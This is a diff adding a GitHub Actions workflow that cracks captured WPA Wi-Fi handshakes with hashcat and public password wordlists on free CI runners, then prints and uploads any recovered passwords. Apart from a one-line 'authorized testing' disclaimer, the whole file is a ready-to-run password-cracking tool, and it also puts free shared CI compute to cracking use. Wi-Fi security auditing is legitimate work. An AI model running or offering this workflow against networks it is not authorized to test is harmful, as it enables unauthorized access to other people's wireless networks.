@@ -1,0 +1,116 @@
+# WPA Handshake Dictionary Attack Workflow
+# For authorized security testing and educational purposes only
+# Uses GitHub Actions free tier (2000 minutes/month for public repos)
+
+name: WPA Dictionary Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      handshake_file:
+        description: 'Handshake file path (.hccap or .hc22000)'
+        required: true
+        default: 'handshake.hc22000'
+      wordlist_url:
+        description: 'Wordlist URL'
+        required: true
+        default: 'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt'
+      hashcat_mode:
+        description: 'Hashcat mode (22000 for hc22000, 2500 for hccap)'
+        required: true
+        default: '22000'
+
+jobs:
+  crack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y hashcat wget
+
+      - name: Download wordlist
+        run: |
+          wget -q "${{ github.event.inputs.wordlist_url }}" -O wordlist.txt
+          echo "Wordlist size: $(wc -l < wordlist.txt) lines"
+
+      - name: Verify handshake file exists
+        run: |
+          if [ ! -f "${{ github.event.inputs.handshake_file }}" ]; then
+            echo "Error: Handshake file not found!"
+            echo "Please add your handshake file to the repository."
+            exit 1
+          fi
+
+      - name: Run hashcat
+        run: |
+          hashcat -m ${{ github.event.inputs.hashcat_mode }} \
+                  ${{ github.event.inputs.handshake_file }} \
+                  wordlist.txt \
+                  --potfile-path=potfile.txt \
+                  -o=cracked.txt \
+                  --status \
+                  --status-timer=30
+
+      - name: Display results
+        run: |
+          if [ -f cracked.txt ]; then
+            echo "=== CRACKED PASSWORDS ==="
+            cat cracked.txt
+          else
+            echo "No passwords cracked with this wordlist."
+            echo "Try a larger wordlist or different attack mode."
+          fi
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: crack-results
+          path: |
+            cracked.txt
+            potfile.txt
+          retention-days: 7
+
+  # CPU-only mode for environments without GPU
+  crack-cpu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y hashcat wget
+
+      - name: Download small wordlist for demo
+        run: |
+          wget -q "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/1000-most-common-passwords.txt" -O wordlist.txt
+          echo "Wordlist size: $(wc -l < wordlist.txt) lines"
+
+      - name: Run hashcat (CPU only, limited iterations)
+        run: |
+          # Run for max 5 minutes as demo
+          timeout 300 hashcat -m 22000 \
+                  handshake.hc22000 \
+                  wordlist.txt \
+                  --potfile-path=potfile.txt \
+                  -o=cracked.txt \
+                  --status \
+                  --status-timer=30 || true
+
+      - name: Display results
+        run: |
+          if [ -f cracked.txt ]; then
+            echo "=== CRACKED PASSWORDS ==="
+            cat cracked.txt
+          else
+            echo "No passwords cracked in demo mode."
+          fi
